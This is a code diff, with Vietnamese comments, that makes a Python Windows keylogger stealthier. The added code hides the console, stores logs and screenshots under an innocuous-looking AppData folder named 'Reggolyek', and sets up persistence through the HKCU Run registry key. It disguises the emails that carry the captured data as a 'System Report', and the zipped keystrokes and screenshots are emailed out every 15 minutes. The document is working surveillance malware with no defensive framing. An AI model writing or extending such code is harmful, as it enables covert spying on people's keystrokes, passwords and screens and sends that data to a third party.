@@ -18,21 +18,21 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
 from dotenv import load_dotenv
-
-# Load environment variables
-load_dotenv()
+import winreg
+import sys
+import argparse
 
 # Cấu hình
-VISIBLE = True  # True để hiện console, False để ẩn
-BOOT_WAIT = True  # True để chờ boot xong
-FORMAT = 0  # 0: mặc định, 10: decimal, 16: hex
-MOUSE_IGNORE = True  # True để bỏ qua click chuột
-EMAIL_INTERVAL = 15 * 60  # 15 phút (tính bằng giây)
+VISIBLE = False  # Ẩn console
+BOOT_WAIT = True  # Chờ boot xong
+AUTO_STARTUP = True  # Tự động startup
+FORMAT = 0
+MOUSE_IGNORE = True
+EMAIL_INTERVAL = 15 * 60
 
-# Email config từ .env
-GMAIL_EMAIL = os.getenv('GMAIL_EMAIL')
-GMAIL_PASSWORD = os.getenv('GMAIL_PASSWORD')
-RECIPIENT_EMAIL = os.getenv('RECIPIENT_EMAIL')
+# VK Constants
+VK_CAPITAL = 0x14
+VK_SHIFT = 0x10
 
 # Mapping phím đặc biệt
 KEY_MAPPING = {
@@ -59,27 +59,121 @@ KEY_MAPPING = {
 
 class Keylogger:
     def __init__(self):
+        # Setup AppData directory FIRST
+        self.setup_appdata_directory()
+        
+        # Load environment variables
+        self.load_env_config()
+        
+        # Initialize variables
         self.output_file = None
         self.current_hour = -1
         self.last_window = ""
         self.running = False
         self.email_timer = None
         
-        # Tạo folder captured nếu chưa có
-        self.captured_folder = "captured"
-        self.logs_folder = os.path.join(self.captured_folder, "logs")
-        self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
-        
+        # Create folders
         self.create_folders()
         self.validate_email_config()
         
-    def create_folders(self):
-        """Tạo các folder cần thiết"""
+        # Setup auto startup
+        if AUTO_STARTUP:
+            self.setup_auto_startup()
+    
+    def setup_appdata_directory(self):
+        """Setup working directory trong AppData\Local"""
         try:
+            # Lấy AppData\Local path
+            appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
+            
+            # Tạo thư mục base trong AppData\Local
+            self.base_dir = os.path.join(appdata_local, "Reggolyek")
+            os.makedirs(self.base_dir, exist_ok=True)
+            
+            # Setup paths cho captured folder
+            self.captured_folder = os.path.join(self.base_dir, "captured")
+            self.logs_folder = os.path.join(self.captured_folder, "logs")
+            self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
+            
+            print(f"Base directory: {self.base_dir}")
+            print(f"Captured folder: {self.captured_folder}")
+            
+        except Exception as e:
+            print(f"Error setting up AppData directory: {e}")
+            # Fallback to temp directory
+            import tempfile
+            self.base_dir = os.path.join(tempfile.gettempdir(), "Reggolyek")
+            os.makedirs(self.base_dir, exist_ok=True)
+            self.captured_folder = os.path.join(self.base_dir, "captured")
+            self.logs_folder = os.path.join(self.captured_folder, "logs")
+            self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
+    
+    def load_env_config(self):
+        """Load cấu hình email từ .env với fallback"""
+        global GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL
+        
+        try:
+            # Lấy thư mục Downloads
+            downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
+            
+            # Thử load từ các locations khác nhau (Downloads ưu tiên đầu)
+            env_locations = [
+                os.path.join(self.base_dir, '.env'),  # AppData folder
+                os.path.join(downloads_folder, 'Reggolyek', 'keylogger', '.env'),  # Downloads/Reggolyek/keylogger/.env
+                os.path.join(downloads_folder, 'Reggolyek', '.env'),  # Downloads/Reggolyek/.env  
+                os.path.join(downloads_folder, '.env'),  # Downloads/.env
+                os.path.join(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__), '.env'),  # Same as exe
+                '.env'  # Current directory
+            ]
+            
+            loaded = False
+            for env_path in env_locations:
+                if os.path.exists(env_path):
+                    load_dotenv(env_path)
+                    print(f"Loaded .env from: {env_path}")
+                    loaded = True
+                    break
+            
+            if not loaded:
+                print("No .env file found, using environment variables")
+                load_dotenv()  # Load from environment
+            
+            # Load config
+            GMAIL_EMAIL = os.getenv('GMAIL_EMAIL')
+            GMAIL_PASSWORD = os.getenv('GMAIL_PASSWORD')
+            RECIPIENT_EMAIL = os.getenv('RECIPIENT_EMAIL')
+            
+            # Copy .env file to AppData nếu tìm thấy ở chỗ khác
+            if loaded and not os.path.exists(os.path.join(self.base_dir, '.env')):
+                for env_path in env_locations[1:]:  # Skip AppData location
+                    if os.path.exists(env_path):
+                        try:
+                            shutil.copy2(env_path, os.path.join(self.base_dir, '.env'))
+                            print(f"Copied .env to AppData: {self.base_dir}")
+                            break
+                        except:
+                            pass
+            
+        except Exception as e:
+            print(f"Error loading env config: {e}")
+            # Set defaults to None
+            GMAIL_EMAIL = GMAIL_PASSWORD = RECIPIENT_EMAIL = None
+    
+    def create_folders(self):
+        """Tạo các folder cần thiết trong AppData"""
+        try:
+            print(f"Creating folders in: {self.captured_folder}")
             os.makedirs(self.captured_folder, exist_ok=True)
             os.makedirs(self.logs_folder, exist_ok=True)
             os.makedirs(self.screenshots_folder, exist_ok=True)
-            print(f"Created folders: {self.captured_folder}, {self.logs_folder}, {self.screenshots_folder}")
+            
+            # Test write permission
+            test_file = os.path.join(self.captured_folder, "test_write.tmp")
+            with open(test_file, 'w') as f:
+                f.write("test")
+            os.remove(test_file)
+            
+            print(f"✓ Created folders successfully at: {self.captured_folder}")
         except Exception as e:
             print(f"Error creating folders: {e}")
     
@@ -96,16 +190,13 @@ class Keylogger:
         """Tạo file zip chứa toàn bộ folder captured"""
         try:
             timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-            zip_filename = f"captured_data_{timestamp}.zip"
+            zip_filename = os.path.join(self.base_dir, f"captured_data_{timestamp}.zip")
             
-            # Tạo zip trong thư mục hiện tại (không trong captured folder)
             with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                # Thêm toàn bộ folder captured vào zip
                 for root, dirs, files in os.walk(self.captured_folder):
                     for file in files:
                         file_path = os.path.join(root, file)
-                        # Tạo đường dẫn tương đối trong zip
-                        arcname = os.path.relpath(file_path, '.')
+                        arcname = os.path.relpath(file_path, self.base_dir)
                         zipf.write(file_path, arcname)
                         print(f"Added to zip: {arcname}")
             
@@ -120,25 +211,24 @@ class Keylogger:
         try:
             print(f"Sending email to {RECIPIENT_EMAIL}...")
             
-            # Tạo message
             msg = MIMEMultipart()
             msg['From'] = GMAIL_EMAIL
             msg['To'] = RECIPIENT_EMAIL
-            msg['Subject'] = f"Keylogger Data - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            msg['Subject'] = f"System Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             
-            # Body email
             body = f"""
-Keylogger Data Report
+System Report
 
 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+Data Location: {self.base_dir}
 
-This email contains captured data from the keylogger.
+This email contains captured system data.
 
 Files included:
 - Log files from keyboard activity
 - Screenshots from window changes
 
-This is an automated message sent every 15 minutes.
+This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
             """
             
             msg.attach(MIMEText(body, 'plain'))
@@ -175,19 +265,19 @@ This is an automated message sent every 15 minutes.
     def delete_captured_folder(self):
         """Xóa toàn bộ folder captured"""
         try:
-            # Đóng file log hiện tại trước khi xóa
             if self.output_file:
-                self.output_file.close()
-                self.output_file = None
+                try:
+                    self.output_file.close()
+                    self.output_file = None
+                except:
+                    pass
             
-            # Xóa toàn bộ folder captured
             if os.path.exists(self.captured_folder):
                 shutil.rmtree(self.captured_folder)
                 print(f"Deleted folder: {self.captured_folder}")
             
-            # Tạo lại folder structure
             self.create_folders()
-            self.current_hour = -1  # Reset để tạo file log mới
+            self.current_hour = -1
             
         except Exception as e:
             print(f"Error deleting captured folder: {e}")
@@ -198,7 +288,6 @@ This is an automated message sent every 15 minutes.
             print("\n" + "="*50)
             print("Starting email send and cleanup process...")
             
-            # Kiểm tra xem có data để gửi không
             has_logs = os.path.exists(self.logs_folder) and os.listdir(self.logs_folder)
             has_screenshots = os.path.exists(self.screenshots_folder) and os.listdir(self.screenshots_folder)
             
@@ -207,32 +296,26 @@ This is an automated message sent every 15 minutes.
                 print("="*50 + "\n")
                 return
             
-            # Tạo zip archive
             zip_filepath = self.create_zip_archive()
             if not zip_filepath:
                 print("Failed to create zip archive")
                 print("="*50 + "\n")
                 return
             
-            # Gửi email
             email_sent = self.send_email_with_attachment(zip_filepath)
             
             if email_sent:
                 print("Email sent successfully!")
-                
-                # Xóa file zip
                 try:
                     os.remove(zip_filepath)
                     print(f"Deleted zip file: {zip_filepath}")
-                except Exception as e:
-                    print(f"Error deleting zip file: {e}")
+                except:
+                    pass
                 
-                # Xóa folder captured
                 self.delete_captured_folder()
                 print("Cleanup completed successfully!")
             else:
                 print("Failed to send email, keeping files")
-                # Xóa zip file nếu gửi email thất bại
                 try:
                     os.remove(zip_filepath)
                 except:
@@ -248,16 +331,14 @@ This is an automated message sent every 15 minutes.
         if self.validate_email_config():
             self.send_and_cleanup()
         
-        # Lên lịch lần tiếp theo
         if self.running:
             print(f"Next email scheduled in {EMAIL_INTERVAL//60} minutes...")
             self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
             self.email_timer.start()
         
     def setup_stealth(self):
-        """Ẩn/hiện console window"""
+        """Ẩn console window"""
         if not VISIBLE:
-            # Ẩn cửa sổ console
             console_window = ctypes.windll.kernel32.GetConsoleWindow()
             if console_window:
                 ctypes.windll.user32.ShowWindow(console_window, 0)
@@ -265,9 +346,8 @@ This is an automated message sent every 15 minutes.
     def is_system_booting(self):
         """Kiểm tra hệ thống có đang boot không"""
         try:
-            # Kiểm tra thời gian uptime
             uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
-            return uptime < 120  # Nếu uptime < 2 phút thì coi như đang boot
+            return uptime < 120
         except:
             return False
     
@@ -295,7 +375,6 @@ This is an automated message sent every 15 minutes.
             filename = f"screenshot_{timestamp}.png"
             filepath = os.path.join(self.screenshots_folder, filename)
             
-            # Chụp toàn màn hình
             screenshot = ImageGrab.grab()
             screenshot.save(filepath)
             print(f"Screenshot saved: {filepath}")
@@ -305,10 +384,8 @@ This is an automated message sent every 15 minutes.
     def process_key(self, key_event):
         """Xử lý phím được bấm"""
         try:
-            # Lấy thời gian hiện tại
             now = datetime.now()
             
-            # Kiểm tra cửa sổ active
             current_window = self.get_active_window_title()
             if current_window != self.last_window and current_window:
                 self.take_screenshot()
@@ -316,7 +393,6 @@ This is an automated message sent every 15 minutes.
                 timestamp_str = now.strftime("%Y-%m-%dT%H:%M:%S")
                 self.write_to_log(f"\n\n[Window: {current_window} - at {timestamp_str}] ")
             
-            # Xử lý phím
             key_str = self.format_key(key_event)
             if key_str:
                 self.write_to_log(key_str)
@@ -329,26 +405,29 @@ This is an automated message sent every 15 minutes.
         try:
             key_name = key_event.name.lower()
             
-            # Bỏ qua mouse clicks nếu được cấu hình
-            if MOUSE_IGNORE and key_name in ['left', 'right', 'middle']:
-                return None
-            
             if FORMAT == 10:
-                return f'[{ord(key_name)}]'
+                if len(key_name) == 1:
+                    return f'[{ord(key_name)}]'
+                else:
+                    return f'[{key_name.upper()}]'
             elif FORMAT == 16:
-                return f'[{hex(ord(key_name))}]'
+                if len(key_name) == 1:
+                    return f'[{hex(ord(key_name))}]'
+                else:
+                    return f'[{key_name.upper()}]'
             else:
-                # Format mặc định
                 if key_name in KEY_MAPPING:
                     return KEY_MAPPING[key_name]
                 elif len(key_name) == 1:
-                    # Kiểm tra Caps Lock và Shift
-                    caps_on = win32api.GetKeyState(win32con.VK_CAPITAL) & 1
-                    shift_pressed = (win32api.GetKeyState(win32con.VK_SHIFT) & 0x8000) != 0
-                    
-                    if caps_on ^ shift_pressed:  # XOR
-                        return key_name.upper()
-                    else:
+                    try:
+                        caps_on = win32api.GetKeyState(VK_CAPITAL) & 1
+                        shift_pressed = (win32api.GetKeyState(VK_SHIFT) & 0x8000) != 0
+                        
+                        if caps_on ^ shift_pressed:
+                            return key_name.upper()
+                        else:
+                            return key_name.lower()
+                    except:
                         return key_name.lower()
                 else:
                     return f'[{key_name.upper()}]'
@@ -361,7 +440,6 @@ This is an automated message sent every 15 minutes.
         try:
             now = datetime.now()
             
-            # Kiểm tra nếu cần tạo file log mới (mỗi giờ)
             if self.current_hour != now.hour:
                 if self.output_file:
                     self.output_file.close()
@@ -372,12 +450,10 @@ This is an automated message sent every 15 minutes.
                 self.output_file = open(filepath, 'a', encoding='utf-8')
                 print(f"Logging to: {filepath}")
             
-            # Ghi vào file
             if self.output_file:
                 self.output_file.write(text)
                 self.output_file.flush()
             
-            # In ra console nếu visible
             if VISIBLE:
                 print(text, end='')
                 
@@ -389,45 +465,77 @@ This is an automated message sent every 15 minutes.
         if key_event.event_type == keyboard.KEY_DOWN:
             self.process_key(key_event)
     
+    def setup_auto_startup(self):
+        """Thêm vào Windows startup"""
+        try:
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            
+            # Đổi tên stealth hơn
+            winreg.SetValueEx(key, "Reggolyek", 0, winreg.REG_SZ, exe_path)
+            winreg.CloseKey(key)
+            
+            print("✓ Added to Windows startup")
+            
+        except Exception as e:
+            print(f"Failed to add to startup: {e}")
+    
+    def remove_from_startup(self):
+        """Xóa khỏi startup"""
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            winreg.DeleteValue(key, "Reggolyek")
+            winreg.CloseKey(key)
+            print("✓ Removed from startup")
+        except:
+            pass
+
     def start(self):
         """Bắt đầu keylogger"""
-        print("Starting keylogger...")
+        print("Starting system monitor...")
+        print(f"Data will be stored in: {self.base_dir}")
         
-        # Setup stealth mode
         self.setup_stealth()
-        
-        # Chờ boot xong
         self.wait_for_boot()
         
-        # Bắt đầu hook keyboard
         self.running = True
         keyboard.hook(self.on_key_event)
         
-        # Bắt đầu timer gửi email
         if self.validate_email_config():
             print(f"Email sending scheduled every {EMAIL_INTERVAL//60} minutes")
             self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
             self.email_timer.start()
         
-        print("Keylogger started. Press Ctrl+C to stop.")
+        print("System monitor started.")
         
         try:
-            # Giữ chương trình chạy
             while self.running:
                 time.sleep(0.1)
         except KeyboardInterrupt:
-            print("\nStopping keylogger...")
+            print("\nStopping system monitor...")
             self.stop()
     
     def stop(self):
         """Dừng keylogger"""
         self.running = False
         
-        # Dừng timer email
         if self.email_timer:
             self.email_timer.cancel()
         
-        # Gửi email cuối cùng trước khi tắt
         if self.validate_email_config():
             print("Sending final email before shutdown...")
             self.send_and_cleanup()
@@ -436,10 +544,19 @@ This is an automated message sent every 15 minutes.
         if self.output_file:
             self.output_file.close()
         
-        print("Keylogger stopped.")
+        print("System monitor stopped.")
 
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--remove-startup', action='store_true', help='Remove from startup')
+    args = parser.parse_args()
+    
     keylogger = Keylogger()
+    
+    if args.remove_startup:
+        keylogger.remove_from_startup()
+        return
+    
     keylogger.start()
 
 if __name__ == "__main__":
